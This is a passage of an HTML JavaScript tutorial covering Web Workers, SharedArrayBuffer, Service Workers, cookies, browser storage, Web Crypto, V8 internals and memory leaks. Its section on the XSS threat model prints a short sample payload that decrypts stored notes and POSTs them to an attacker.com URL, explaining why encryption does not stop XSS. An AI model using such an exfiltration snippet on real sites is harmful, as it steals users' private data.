+<p>This design was a deliberate trade-off: shared-memory multithreading (as in C/Java) requires locks, and locks in a UI thread that also handles user input and rendering are a well-known source of deadlocks and freezes. JS's single-threaded-per-realm model makes an entire class of concurrency bugs (data races on shared objects) structurally impossible on the main thread — at the cost of needing explicit APIs (Workers) to use multiple CPU cores at all.</p>
+<pre><code>Main thread realm:  [event loop] -- [call stack] -- DOM access, UI events
+Worker 1 realm:     [event loop] -- [call stack] -- NO DOM access, own globals
+Worker 2 realm:     [event loop] -- [call stack] -- NO DOM access, own globals
+                     ^ each is single-threaded internally; the THREE run in parallel</code></pre>
+<h2 id="38-web-workers-postmessage-structured-clone-transferable-objects">38. Web Workers: <code>postMessage</code>, structured clone, transferable objects<a class="anchor" href="#38-web-workers-postmessage-structured-clone-transferable-objects" aria-hidden="true">#</a></h2>
+<p>A <strong>dedicated Worker</strong> runs a separate script on its own OS thread, with its own global scope (<code>self</code>, not <code>window</code>) — no DOM access, but full access to <code>fetch</code>, timers, and (crucially) heavy computation that would otherwise freeze the UI.</p>
+<pre data-lang="javascript"><code>// main.js
+const worker = new Worker("worker.js");
+worker.postMessage({ cmd: "compute", n: 40 });
+worker.onmessage = (e) =&gt; console.log("fibonacci result:", e.data.result);
+worker.onerror = (e) =&gt; console.error("worker crashed:", e.message);
+
+// worker.js
+self.onmessage = (e) =&gt; {
+  if (e.data.cmd === "compute") {
+    const result = fib(e.data.n);          // blocks the WORKER thread, not the main thread
+    self.postMessage({ result });
+  }
+};
+function fib(n) { return n &lt;= 1 ? n : fib(n - 1) + fib(n - 2); }</code></pre>
+<p>Data passed via <code>postMessage</code> is <strong>copied</strong>, not shared, using the <strong>structured clone algorithm</strong> — which handles objects, arrays, <code>Map</code>/<code>Set</code>, <code>Date</code>, and typed arrays, but NOT functions, DOM nodes, or class instances with methods/prototypes (only their plain-data shape survives).</p>
+<pre data-lang="javascript"><code>worker.postMessage({ date: new Date(), items: new Map([["a", 1]]) }); // fine, structured-clonable
+worker.postMessage({ fn: () =&gt; {} });   // throws DataCloneError — functions aren't clonable</code></pre>
+<p><strong>Transferable objects</strong> avoid the copy entirely for large binary data — ownership of the underlying memory moves to the receiver, and the sender's reference becomes unusable (zero-copy, not "clone-then-delete"):</p>
+<pre data-lang="javascript"><code>const buffer = new ArrayBuffer(64 * 1024 * 1024);  // 64MB
+worker.postMessage({ buffer }, [buffer]);           // second arg: list of transferables
+buffer.byteLength;   // 0 — the sender no longer owns this memory at all</code></pre>
+<h2 id="39-sharedarraybuffer-and-atomics-real-shared-memory-concurrency">39. <code>SharedArrayBuffer</code> and <code>Atomics</code>: real shared-memory concurrency<a class="anchor" href="#39-sharedarraybuffer-and-atomics-real-shared-memory-concurrency" aria-hidden="true">#</a></h2>
+<p>Unlike a regular <code>ArrayBuffer</code> (owned by one realm at a time), a <strong><code>SharedArrayBuffer</code></strong> can be given to multiple workers simultaneously, with all of them reading and writing the <em>same</em> underlying memory — this is genuine shared-memory multithreading, the first time JS ever had it.</p>
+<pre data-lang="javascript"><code>// main.js
+const sab = new SharedArrayBuffer(4);           // 4 bytes = one Int32
+const view = new Int32Array(sab);
+Atomics.store(view, 0, 0);
+
+worker.postMessage(sab);   // NOT copied, NOT transferred — genuinely SHARED
+
+worker.onmessage = () =&gt; console.log("final value:", Atomics.load(view, 0));
+worker.postMessage("start");
+
+// worker.js — receives the SAME memory, both threads can race on it
+let sharedView;
+self.onmessage = (e) =&gt; {
+  if (e.data instanceof SharedArrayBuffer) { sharedView = new Int32Array(e.data); return; }
+  for (let i = 0; i &lt; 1000; i++) Atomics.add(sharedView, 0, 1);  // ATOMIC increment — no lost updates
+  self.postMessage("done");
+};</code></pre>
+<p><strong><code>Atomics</code></strong> provides the lock-free primitives (<code>add</code>, <code>compareExchange</code>, <code>load</code>, <code>store</code>, <code>wait</code>, <code>notify</code>) required to touch shared memory safely — without them, two threads doing <code>sharedView[0]++</code> concurrently is a classic data race (read-modify-write isn't atomic), silently dropping increments. <code>Atomics.wait</code>/<code>notify</code> implement real blocking synchronization (a condition-variable-like primitive) between worker threads — genuinely novel capability in JS, previously impossible without shared memory.</p>
+<p><strong>The security catch</strong>: <code>SharedArrayBuffer</code> was disabled globally across all major browsers in 2018 in response to Spectre (a shared-memory, high- resolution timer is exactly the primitive needed for that class of speculative-execution side-channel attack). It's back today <strong>only</strong> on pages that opt into <strong>cross-origin isolation</strong>:</p>
+<pre><code># Required response headers on the top-level document to re-enable SharedArrayBuffer:
+Cross-Origin-Opener-Policy: same-origin
+Cross-Origin-Embedder-Policy: require-corp</code></pre>
+<p>Without both headers set, <code>typeof SharedArrayBuffer === "undefined"</code> in the page — this trips up a lot of teams trying to ship WASM-threads-based tools (FFmpeg.wasm, SQLite-in-a-worker with true concurrency) who forget the cross-origin-isolation requirement is now mandatory.</p>
+<h2 id="40-shared-workers-and-service-workers-lifecycle-scope-background-sync">40. Shared Workers and Service Workers: lifecycle, scope, background sync<a class="anchor" href="#40-shared-workers-and-service-workers-lifecycle-scope-background-sync" aria-hidden="true">#</a></h2>
+<div class="tbl"><table>
+<thead><tr><th></th><th>Instances</th><th>Lifetime</th><th>Purpose</th></tr></thead>
+<tbody>
+<tr><td><strong>Dedicated Worker</strong> (§38)</td><td>One per creating tab</td><td>Dies with the tab</td><td>Offload computation from one page</td></tr>
+<tr><td><strong>Shared Worker</strong></td><td>ONE instance shared across all same-origin tabs</td><td>Dies when the last connected tab closes</td><td>Cross-tab state (a shared cache, a single WebSocket serving multiple tabs)</td></tr>
+<tr><td><strong>Service Worker</strong></td><td>ONE per origin, runs independently of any open tab</td><td>Survives tab closure; browser can terminate/restart it anytime between events</td><td>Network proxy — offline caching, background sync, push notifications</td></tr>
+</tbody></table></div>
+<p>A <strong>Service Worker</strong> is the most architecturally distinct: it sits as a programmable network proxy <strong>between your page and the network</strong>, letting you intercept every <code>fetch</code> and decide whether to serve from cache, network, or a mix — the foundation of every installable, offline-capable Progressive Web App.</p>
+<pre data-lang="javascript"><code>// sw.js — registered once via navigator.serviceWorker.register("/sw.js")
+const CACHE_NAME = "app-v1";
+const PRECACHE_URLS = ["/", "/app.js", "/app.css", "/offline.html"];
+
+self.addEventListener("install", (event) =&gt; {
+  event.waitUntil(
+    caches.open(CACHE_NAME).then((cache) =&gt; cache.addAll(PRECACHE_URLS))
+  );
+});
+
+self.addEventListener("fetch", (event) =&gt; {
+  event.respondWith(
+    caches.match(event.request).then((cached) =&gt; {
+      if (cached) return cached;                         // cache-first for known assets
+      return fetch(event.request).catch(() =&gt; caches.match("/offline.html")); // offline fallback
+    })
+  );
+});
+
+self.addEventListener("activate", (event) =&gt; {
+  // clean up old cache versions on activation
+  event.waitUntil(
+    caches.keys().then((keys) =&gt;
+      Promise.all(keys.filter((k) =&gt; k !== CACHE_NAME).map((k) =&gt; caches.delete(k)))
+    )
+  );
+});</code></pre>
+<p>The Service Worker lifecycle (<code>install</code> → <code>waiting</code> → <code>activate</code>) is deliberately conservative — a new Service Worker version installs <strong>alongside</strong> the currently active one and only takes over once all tabs using the old version have closed (unless you explicitly call <code>self.skipWaiting()</code>), preventing a mid-session version mismatch between your JS and your cached assets.</p>
+<h2 id="41-multi-threaded-architecture-patterns-worker-pools-comlink-style-rpc">41. Multi-threaded architecture patterns: worker pools, Comlink-style RPC<a class="anchor" href="#41-multi-threaded-architecture-patterns-worker-pools-comlink-style-rpc" aria-hidden="true">#</a></h2>
+<p>Raw <code>postMessage</code> with manual <code>cmd</code>/<code>result</code> message shapes (§38) doesn't scale past a couple of message types — real apps use two patterns:</p>
+<p><strong>Worker pool</strong> — a fixed number of persistent workers pulling tasks from a shared queue, avoiding the real cost of spinning up a new worker per task (worker creation involves a full separate JS realm bootstrap, not free):</p>
+<pre data-lang="javascript"><code>class WorkerPool {
+  #workers; #queue = []; #idle = [];
+  constructor(scriptUrl, size = navigator.hardwareConcurrency || 4) {
+    this.#workers = Array.from({ length: size }, () =&gt; {
+      const w = new Worker(scriptUrl);
+      w.onmessage = (e) =&gt; this.#handleResult(w, e.data);
+      return w;
+    });
+    this.#idle = [...this.#workers];
+  }
+  run(task) {
+    return new Promise((resolve) =&gt; {
+      this.#queue.push({ task, resolve });
+      this.#dispatch();
+    });
+  }
+  #dispatch() {
+    while (this.#idle.length &amp;&amp; this.#queue.length) {
+      const worker = this.#idle.pop();
+      const { task, resolve } = this.#queue.shift();
+      worker.__resolve = resolve;
+      worker.postMessage(task);
+    }
+  }
+  #handleResult(worker, data) {
+    worker.__resolve(data);
+    this.#idle.push(worker);
+    this.#dispatch();
+  }
+}</code></pre>
+<p><strong>RPC-style wrappers (Comlink)</strong> eliminate the manual message-shape boilerplate entirely by proxying method calls transparently over <code>postMessage</code>:</p>
+<pre data-lang="javascript"><code>// worker.js
+import * as Comlink from "comlink";
+const api = { fib(n) { return n &lt;= 1 ? n : api.fib(n - 1) + api.fib(n - 2); } };
+Comlink.expose(api);
+
+// main.js — CALLS THE WORKER LIKE A NORMAL ASYNC FUNCTION, no postMessage visible at all
+import * as Comlink from "comlink";
+const worker = new Worker("worker.js");
+const api = Comlink.wrap(worker);
+const result = await api.fib(40);   // looks synchronous-ish, actually round-trips via postMessage</code></pre>
+<blockquote>
+<p><strong>Real-world example.</strong> Figma, Photoshop's web version, and FFmpeg.wasm's browser build all use worker pools for exactly this reason: image/video processing is CPU-bound and would otherwise freeze the entire UI (including scroll, clicks, and rendering) for the duration of the computation.</p>
+</blockquote>
+<h2 id="42-mini-project-a-multi-threaded-mandelbrot-renderer-worker-pool-sab">42. Mini project: a multi-threaded Mandelbrot renderer (worker pool + SAB)<a class="anchor" href="#42-mini-project-a-multi-threaded-mandelbrot-renderer-worker-pool-sab" aria-hidden="true">#</a></h2>
+<pre data-lang="javascript"><code>// mandelbrot-worker.js — computes one horizontal STRIP of the image into shared memory
+self.onmessage = ({ data: { sab, width, height, startRow, endRow, maxIter } }) =&gt; {
+  const pixels = new Uint8ClampedArray(sab);
+  for (let y = startRow; y &lt; endRow; y++) {
+    for (let x = 0; x &lt; width; x++) {
+      const cx = (x / width) * 3.5 - 2.5;
+      const cy = (y / height) * 2 - 1;
+      let zx = 0, zy = 0, iter = 0;
+      while (zx * zx + zy * zy &lt; 4 &amp;&amp; iter &lt; maxIter) {
+        const xtemp = zx * zx - zy * zy + cx;
+        zy = 2 * zx * zy + cy;
+        zx = xtemp;
+        iter++;
+      }
+      const idx = (y * width + x) * 4;
+      const shade = (iter / maxIter) * 255;
+      pixels[idx] = pixels[idx + 1] = pixels[idx + 2] = shade;
+      pixels[idx + 3] = 255;
+    }
+  }
+  self.postMessage({ startRow, endRow });   // just a completion signal — pixel data is ALREADY
+};                                            // in the shared buffer, no copy needed back
+
+// main.js — splits the image into N horizontal strips, one per worker, writing
+// directly into one SharedArrayBuffer (requires COOP/COEP headers, see §39)
+async function renderMandelbrot(canvas, maxIter = 300) {
+  const { width, height } = canvas;
+  const sab = new SharedArrayBuffer(width * height * 4);
+  const workerCount = navigator.hardwareConcurrency || 4;
+  const rowsPerWorker = Math.ceil(height / workerCount);
+
+  const jobs = Array.from({ length: workerCount }, (_, i) =&gt; {
+    const worker = new Worker("mandelbrot-worker.js");
+    const startRow = i * rowsPerWorker;
+    const endRow = Math.min(startRow + rowsPerWorker, height);
+    return new Promise((resolve) =&gt; {
+      worker.onmessage = () =&gt; { worker.terminate(); resolve(); };
+      worker.postMessage({ sab, width, height, startRow, endRow, maxIter });
+    });
+  });
+
+  await Promise.all(jobs);   // all strips computed IN PARALLEL across real CPU cores
+  const imageData = new ImageData(new Uint8ClampedArray(sab), width, height);
+  canvas.getContext("2d").putImageData(imageData, 0, 0);
+}</code></pre>
+<p>On an 8-core machine this renders roughly 8x faster than a single-threaded loop, and — critically — the main thread never blocks, so the page stays scrollable and responsive throughout the entire computation, unlike running the same loop directly in a <code>&lt;script&gt;</code>.</p>
+<hr>
+<h1 id="part-vii-client-side-storage-and-encryption">Part VII — Client-side storage and encryption<a class="anchor" href="#part-vii-client-side-storage-and-encryption" aria-hidden="true">#</a></h1>
+<h2 id="43-cookies-in-depth-attributes-httponly-secure-samesite">43. Cookies in depth: attributes, <code>HttpOnly</code>/<code>Secure</code>/<code>SameSite</code><a class="anchor" href="#43-cookies-in-depth-attributes-httponly-secure-samesite" aria-hidden="true">#</a></h2>
+<p>Cookies are the oldest browser storage mechanism and the only one <strong>automatically sent with every matching HTTP request</strong> — which is exactly what makes them right for session tokens and wrong for anything large or non-auth-related (they add latency to every single request, including ones for images and static assets).</p>
+<pre data-lang="javascript"><code>document.cookie = "theme=dark; max-age=31536000; path=/; SameSite=Lax";
+// document.cookie is a deceptively simple-looking API for a genuinely
+// weird format: reading it returns ALL cookies as one semicolon-joined
+// string; writing it sets exactly ONE cookie per call.</code></pre>
+<p>Security-relevant attributes, set by the <strong>server</strong> (never fully trustworthy if set only from JS, since JS-set cookies can't set <code>HttpOnly</code> on themselves):</p>
+<pre><code>Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/
+
+HttpOnly   -&gt; JS (document.cookie) CANNOT read this cookie at all — the single
+              most important XSS mitigation for session tokens: even a full
+              XSS payload cannot exfiltrate an HttpOnly cookie via JS.
+Secure     -&gt; only sent over HTTPS, never plaintext HTTP.
+SameSite=Strict -&gt; never sent on cross-site requests, even top-level navigation
+                     from an external link (strongest CSRF protection, but
+                     breaks "click an email link and stay logged in" flows).
+SameSite=Lax    -&gt; sent on top-level cross-site navigation (clicking a link)
+                     but NOT on cross-site subrequests (images, fetches,
+                     iframes) — the modern browser DEFAULT, a reasonable
+                     CSRF/usability balance.
+SameSite=None   -&gt; sent on all cross-site requests; REQUIRES Secure — needed
+                     for legitimate third-party embeds (payment widgets,
+                     SSO iframes), but is exactly the setting that enables
+                     cross-site tracking, which is why browsers are
+                     progressively restricting third-party cookies entirely.</code></pre>
+<blockquote>
+<p><strong>War story.</strong> An app stored its auth token in <code>localStorage</code> "for easy JS access" instead of an <code>HttpOnly</code> cookie. A single stored-XSS bug in an unrelated comment-rendering feature let an attacker's script read <code>localStorage.authToken</code> directly and exfiltrate it to an external server — full account takeover from one XSS bug, because nothing stood between the attacker's injected script and the token. An <code>HttpOnly</code> cookie would have made that specific token structurally unreadable by the same injected script, containing the blast radius to whatever the XSS could do live in the page, not a portable stolen credential.</p>
+</blockquote>
+<h2 id="44-localstorage-and-sessionstorage-api-quotas-pitfalls">44. <code>localStorage</code> and <code>sessionStorage</code>: API, quotas, pitfalls<a class="anchor" href="#44-localstorage-and-sessionstorage-api-quotas-pitfalls" aria-hidden="true">#</a></h2>
+<p>Both are part of the <strong>Web Storage API</strong>, sharing the same simple key-value string interface, and are <strong>NOT sent with HTTP requests</strong> (unlike cookies) — purely client-side, only ever read by JS explicitly.</p>
+<pre data-lang="javascript"><code>localStorage.setItem("theme", "dark");     // persists across tabs, browser restarts, forever
+localStorage.getItem("theme");             // "dark"
+localStorage.removeItem("theme");
+localStorage.clear();                       // wipes EVERYTHING for this origin
+
+sessionStorage.setItem("draft", "hello");  // scoped to ONE TAB, cleared when that tab closes
+                                             // (a NEW tab to the same site, even same URL,
+                                             // gets a fresh, empty sessionStorage)</code></pre>
+<p>Real gotchas engineers hit repeatedly:</p>
+<ul>
+<li><strong>Synchronous, main-thread blocking</strong>: every <code>getItem</code>/<code>setItem</code> call is synchronous disk I/O on the main thread — storing large values or calling it in a hot loop measurably janks the page. There is no async Web Storage API; if you need async, that's a signal to use IndexedDB (§45) instead.</li>
+<li><strong>Strings only</strong>: <code>setItem</code> silently coerces non-strings via <code>String(value)</code> — storing an object without <code>JSON.stringify</code> first stores the useless literal string <code>"[object Object]"</code>.</li>
+<li><strong>~5-10MB quota per origin</strong> (varies by browser), and exceeding it throws a <code>QuotaExceededError</code> you must catch explicitly.</li>
+<li><strong>Not available in all contexts</strong>: throws in some sandboxed iframes and in Safari's Private Browsing mode (historically silently no-oped, now throws) — always wrap in <code>try/catch</code> for a library meant to run broadly.</li>
+<li><strong>Never store secrets in plaintext</strong>: any XSS on the page can read <code>localStorage</code> directly — see §47 for what this specifically does and doesn't rule out.
+<pre data-lang="javascript"><code>function safeSetItem(key, value) {
+try {
+  localStorage.setItem(key, JSON.stringify(value));
+  return true;
+} catch (err) {
+  if (err.name === "QuotaExceededError") console.warn("Storage full");
+  return false;
+}
+}</code></pre>
+</li>
+</ul>
+<h2 id="45-indexeddb-transactional-storage-for-structured-larger-data">45. IndexedDB: transactional storage for structured, larger data<a class="anchor" href="#45-indexeddb-transactional-storage-for-structured-larger-data" aria-hidden="true">#</a></h2>
+<p>IndexedDB is a full <strong>asynchronous, transactional, indexed</strong> database built into the browser — the right tool once data outgrows Web Storage's 5-10MB string-only model (offline app data, cached API responses, encrypted blobs from §46-48).</p>
+<pre data-lang="javascript"><code>function openDB() {
+  return new Promise((resolve, reject) =&gt; {
+    const req = indexedDB.open("notes-app", 1);
+    req.onupgradeneeded = (e) =&gt; {
+      const db = e.target.result;
+      const store = db.createObjectStore("notes", { keyPath: "id" });
+      store.createIndex("by-date", "createdAt");   // queryable secondary index
+    };
+    req.onsuccess = () =&gt; resolve(req.result);
+    req.onerror = () =&gt; reject(req.error);
+  });
+}
+
+async function addNote(db, note) {
+  return new Promise((resolve, reject) =&gt; {
+    const tx = db.transaction("notes", "readwrite");
+    tx.objectStore("notes").add(note);
+    tx.oncomplete = () =&gt; resolve();
+    tx.onerror = () =&gt; reject(tx.error);
+  });
+}
+
+async function getAllNotesSortedByDate(db) {
+  return new Promise((resolve, reject) =&gt; {
+    const tx = db.transaction("notes", "readonly");
+    const index = tx.objectStore("notes").index("by-date");
+    const results = [];
+    index.openCursor().onsuccess = (e) =&gt; {
+      const cursor = e.target.result;
+      if (cursor) { results.push(cursor.value); cursor.continue(); }
+      else resolve(results);
+    };
+    tx.onerror = () =&gt; reject(tx.error);
+  });
+}</code></pre>
+<p>The raw callback-based API is notoriously verbose — in real projects, wrap it with a promise-based library (<code>idb</code> is the standard choice) rather than hand-rolling this every time; the example above shows what that library is doing underneath so debugging a leaked transaction or a version-upgrade bug isn't a black box.</p>
+<h2 id="46-the-web-crypto-api-hashing-aes-gcm-key-derivation-asymmetric-crypto">46. The Web Crypto API: hashing, AES-GCM, key derivation, asymmetric crypto<a class="anchor" href="#46-the-web-crypto-api-hashing-aes-gcm-key-derivation-asymmetric-crypto" aria-hidden="true">#</a></h2>
+<p><code>crypto.subtle</code> (<strong>SubtleCrypto</strong>) is the browser's native, hardware-backed cryptography API — always prefer it over any pure-JS crypto library for primitives it supports, both for correctness (no re-implemented, easy-to- get-wrong primitives) and speed (native code, sometimes hardware-accelerated).</p>
+<p><strong>Hashing</strong> (one-way, for integrity checks and password-adjacent use — never for storing passwords directly, see PBKDF2 below):</p>
+<pre data-lang="javascript"><code>async function sha256(text) {
+  const data = new TextEncoder().encode(text);
+  const hashBuffer = await crypto.subtle.digest("SHA-256", data);
+  return Array.from(new Uint8Array(hashBuffer))
+    .map((b) =&gt; b.toString(16).padStart(2, "0")).join("");
+}
+await sha256("hello");  // "2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824"</code></pre>
+<p><strong>Symmetric encryption (AES-GCM)</strong> — the standard choice for encrypting data you'll decrypt yourself later (client-side vault, encrypted notes, §48):</p>
+<pre data-lang="javascript"><code>async function generateKey() {
+  return crypto.subtle.generateKey({ name: "AES-GCM", length: 256 }, true, ["encrypt", "decrypt"]);
+}
+
+async function encrypt(key, plaintext) {
+  const iv = crypto.getRandomValues(new Uint8Array(12));   // MUST be unique per encryption
+  const ciphertext = await crypto.subtle.encrypt(
+    { name: "AES-GCM", iv }, key, new TextEncoder().encode(plaintext)
+  );
+  return { iv, ciphertext };   // store BOTH — decryption needs the exact same iv
+}
+
+async function decrypt(key, { iv, ciphertext }) {
+  const plaintextBuffer = await crypto.subtle.decrypt({ name: "AES-GCM", iv }, key, ciphertext);
+  return new TextDecoder().decode(plaintextBuffer);
+}</code></pre>
+<p><strong>Deriving a key from a user password (PBKDF2)</strong> — never use a password directly as an encryption key; derive a proper key through many hashing iterations to make brute-forcing expensive:</p>
+<pre data-lang="javascript"><code>async function deriveKeyFromPassword(password, salt) {
+  const keyMaterial = await crypto.subtle.importKey(
+    "raw", new TextEncoder().encode(password), "PBKDF2", false, ["deriveKey"]
+  );
+  return crypto.subtle.deriveKey(
+    { name: "PBKDF2", salt, iterations: 600_000, hash: "SHA-256" },  // OWASP 2023+ minimum
+    keyMaterial,
+    { name: "AES-GCM", length: 256 },
+    true,
+    ["encrypt", "decrypt"]
+  );
+}</code></pre>
+<p><strong>Asymmetric crypto (ECDSA for signing, RSA-OAEP/ECDH for key exchange)</strong> — for verifying authenticity or exchanging a symmetric key without ever transmitting it:</p>
+<pre data-lang="javascript"><code>async function signMessage(privateKey, message) {
+  const signature = await crypto.subtle.sign(
+    { name: "ECDSA", hash: "SHA-256" }, privateKey, new TextEncoder().encode(message)
+  );
+  return signature;
+}
+async function verifySignature(publicKey, signature, message) {
+  return crypto.subtle.verify(
+    { name: "ECDSA", hash: "SHA-256" }, publicKey, signature, new TextEncoder().encode(message)
+  );
+}</code></pre>
+<h2 id="47-what-client-side-encryption-can-t-protect-against-the-xss-threat-model">47. What client-side encryption can't protect against: the XSS threat model<a class="anchor" href="#47-what-client-side-encryption-can-t-protect-against-the-xss-threat-model" aria-hidden="true">#</a></h2>
+<p>This is the section engineers skip and then get burned by. Client-side encryption is real cryptography — AES-GCM via <code>SubtleCrypto</code> is not "fake" — but its <strong>threat model is narrower than people assume</strong>, and misunderstanding the boundary leads to false confidence.</p>
+<p><strong>What it DOES protect against</strong>: someone with direct access to the raw storage (a stolen device's disk, a rogue browser extension without script injection, an attacker who dumps IndexedDB/localStorage files offline) seeing your plaintext data. If the ciphertext leaks but the key doesn't, the data is genuinely unreadable.</p>
+<p><strong>What it does NOT protect against</strong>: <strong>if an attacker can run JavaScript in your page's origin (XSS), the encryption is worthless</strong>, because:</p>
+<pre><code>1. Your page's JS needs the encryption key to decrypt data for the user to
+   see it.
+2. An XSS payload runs with the EXACT SAME privileges as your legitimate
+   JS — it can call the same crypto.subtle functions, read the same
+   in-memory key variable, or simply wait for YOUR code to decrypt the data
+   and then read the plaintext result directly out of the DOM or a JS variable.
+3. There is no way to keep a secret from code running in the same origin —
+   sandboxing is per-ORIGIN (§18), not per-script-tag.</code></pre>
+<pre data-lang="javascript"><code>// This "protects" data from someone reading raw localStorage bytes...
+const encrypted = await encrypt(key, sensitiveNote);
+localStorage.setItem("note", JSON.stringify(encrypted));
+
+// ...but an XSS payload just does this instead, using YOUR OWN decrypt function:
+const stolen = await decrypt(window.appEncryptionKey, JSON.parse(localStorage.note));
+fetch("https://attacker.com/steal", { method: "POST", body: stolen });
+// No cryptographic weakness was exploited here — the attacker simply ran
+// code with the same permissions your app already had.</code></pre>
+<p><strong>The correct mental model</strong>: client-side encryption's realistic value is <strong>protecting data at rest against non-script-execution threats</strong> — untrusted storage/sync providers, device theft, a browser extension with storage access but not script-injection into your origin, or a zero-knowledge architecture where <em>even your own server</em> should never see plaintext (password managers, encrypted note apps). It is <strong>not</strong> a defense against XSS — that defense is CSP, output encoding, and avoiding <code>innerHTML</code>/<code>eval</code> with untrusted input, full stop. Treat client-side encryption and XSS prevention as two separate, complementary controls, never as substitutes for each other.</p>
+<h2 id="48-mini-project-an-encrypted-notes-app-web-crypto-indexeddb">48. Mini project: an encrypted notes app (Web Crypto + IndexedDB)<a class="anchor" href="#48-mini-project-an-encrypted-notes-app-web-crypto-indexeddb" aria-hidden="true">#</a></h2>
+<p>Combining §45 (IndexedDB) and §46 (Web Crypto) into a zero-knowledge-style notes app: the server (or sync provider) only ever sees encrypted blobs.</p>
+<pre data-lang="javascript"><code>class EncryptedNotesStore {
+  #db; #key;
+
+  async init(password) {
+    this.#db = await openDB();   // from §45
+    const salt = await this.#getOrCreateSalt();
+    this.#key = await deriveKeyFromPassword(password, salt);   // from §46
+  }
+
+  async #getOrCreateSalt() {
+    let salt = localStorage.getItem("salt");
+    if (!salt) {
+      const bytes = crypto.getRandomValues(new Uint8Array(16));
+      salt = btoa(String.fromCharCode(...bytes));
+      localStorage.setItem("salt", salt);   // salt is NOT secret, safe to store plainly
+    }
+    return Uint8Array.from(atob(salt), (c) =&gt; c.charCodeAt(0));
+  }
+
+  async saveNote(id, plaintext) {
+    const { iv, ciphertext } = await encrypt(this.#key, plaintext);
+    await addNote(this.#db, {
+      id,
+      iv: Array.from(iv),
+      ciphertext: Array.from(new Uint8Array(ciphertext)),
+      createdAt: Date.now(),
+    });
+  }
+
+  async loadNote(record) {
+    return decrypt(this.#key, {
+      iv: new Uint8Array(record.iv),
+      ciphertext: new Uint8Array(record.ciphertext).buffer,
+    });
+  }
+}
+
+// usage
+const store = new EncryptedNotesStore();
+await store.init("correct horse battery staple");
+await store.saveNote("note-1", "Meet at the docks, midnight.");</code></pre>
+<p>If this synced <code>ciphertext</code>/<code>iv</code>/<code>salt</code> to a server, that server (or anyone who breaches it) would see only opaque bytes — but per §47, this app is still fully readable by any successful XSS against its own origin, since the derived key lives in that origin's memory the moment the user's password is entered. A production version would add a strict CSP (§51) as the actual defense against that scenario, not more crypto.</p>
+<hr>
+<h1 id="part-viii-expert-engine-internals-and-browser-security">Part VIII — Expert: engine internals and browser security<a class="anchor" href="#part-viii-expert-engine-internals-and-browser-security" aria-hidden="true">#</a></h1>
+<h2 id="49-inside-v8-parsing-ignition-bytecode-turbofan-hidden-classes-inline-caches">49. Inside V8: parsing, Ignition bytecode, TurboFan, hidden classes, inline caches<a class="anchor" href="#49-inside-v8-parsing-ignition-bytecode-turbofan-hidden-classes-inline-caches" aria-hidden="true">#</a></h2>
+<p>V8's pipeline, from source text to fast machine code:</p>
+<pre><code>Source -&gt; Scanner/Parser -&gt; AST -&gt; Ignition (bytecode interpreter)
+                                        │
+                              runtime profiles hot functions
+                                        ▼
+                          Sparkplug (fast baseline JIT, no optimization)
+                                        │
+                              still hot + type-stable?
+                                        ▼
+                     TurboFan (optimizing JIT: inlining, type
+                     specialization, dead code elimination)
+                                        │
+                        assumption violated at runtime?
+                                        ▼
+                          DEOPTIMIZATION back to Ignition bytecode</code></pre>
+<p>V8 never compiles everything to optimized machine code upfront — that would make page load slow for code that runs once. Instead it starts interpreting immediately (fast startup) and only invests optimization effort in functions proven "hot" by actual runtime execution counts.</p>
+<p><strong>Hidden classes (Shapes/Maps internally)</strong>: V8 doesn't treat JS objects as generic hash maps — it dynamically creates hidden internal "classes" describing an object's shape (which properties, in which order, what types), and objects with the same shape share the same hidden class. This is why <strong>adding properties to an object in a consistent order</strong> across many instances is measurably faster than adding them inconsistently:</p>
+<pre data-lang="javascript"><code>// FAST: both objects get the SAME hidden class (same properties, same order)
+function makePointGood(x, y) { return { x, y }; }
+const p1 = makePointGood(1, 2);
+const p2 = makePointGood(3, 4);   // shares p1's hidden class — V8 can optimize property access
+
+// SLOW: different construction order/shape per object forces V8 to create
+// and track SEPARATE hidden classes, defeating this optimization entirely
+const p3 = {}; p3.x = 1; p3.y = 2;
+const p4 = {}; p4.y = 4; p4.x = 3;   // different insertion order -&gt; different hidden class</code></pre>
+<p><strong>Inline caches (ICs)</strong>: at each property-access call site, V8 remembers which hidden class it last saw and caches the exact memory offset for that property — subsequent calls at the same call site with the same-shaped object skip the lookup entirely ("monomorphic" — fastest). A call site that sees many different shapes ("megamorphic") loses this optimization and falls back to a slower generic lookup — another concrete reason consistent object shapes matter for hot code paths.</p>
+<h2 id="50-garbage-collection-and-memory-leaks-in-real-js-apps">50. Garbage collection and memory leaks in real JS apps<a class="anchor" href="#50-garbage-collection-and-memory-leaks-in-real-js-apps" aria-hidden="true">#</a></h2>
+<p>V8 uses a <strong>generational garbage collector</strong>, based on the empirical observation that most objects die young: two heap generations, collected with different strategies.</p>
+<pre><code>Young generation (small, "Scavenger" GC — fast, frequent)
+  - new objects allocated here first
+  - most die almost immediately (a temporary object in a function call) -&gt;
+    cheap to collect because most of the generation IS garbage
+  - objects that SURVIVE a couple of scavenges get PROMOTED to:
+
+Old generation (large, "Mark-Sweep-Compact" GC — slower, less frequent)
+  - long-lived objects: app state, caches, closures held for a page's lifetime
+  - collected less often since triggering a full mark-sweep is expensive</code></pre>
+<p><strong>Memory leaks in JS</strong> aren't "forgotten <code>free()</code>" bugs (there's no manual free) — they're <strong>references you didn't mean to keep</strong>, which prevent the GC from ever considering an object garbage. The recurring real-world patterns:</p>
+<pre data-lang="javascript"><code>// 1. Detached DOM nodes: removing an element from the document but keeping
+//    a JS reference to it anywhere (a cache, an event-handler closure) keeps
+//    its ENTIRE subtree alive in memory even though it's invisible.
+const detachedCache = [];
+function removeAndLeak(el) {
+  el.remove();               // gone from the visible DOM...
+  detachedCache.push(el);    // ...but still alive in memory via this array
+}
+
+// 2. Forgotten event listeners / timers holding closures over large state
+function setupLeak(largeData) {
+  window.addEventListener("resize", () =&gt; console.log(largeData.length));
+  // if this component is ever "destroyed" without removeEventListener,
+  // `largeData` is held alive forever by the still-registered listener
+}
+
+// 3. Growing caches/maps with no eviction — a Map that only ever grows
+//    is a slow, "successful" memory leak by design, just not called one
+const cache = new Map();
+function memoize(key, computeFn) {
+  if (!cache.has(key)) cache.set(key, computeFn());   // never evicted -&gt; unbounded growth
+  return cache.get(key);
+}</code></pre>
+<p>Diagnosing leaks with DevTools: <strong>Memory panel → take a heap snapshot → perform the suspected leaking action several times → take another snapshot → use "Comparison" view</strong> to see which object types grew between snapshots that shouldn't have — a detached <code>HTMLDivElement</code> count climbing steadily is the single most common finding in real leak hunts.</p>
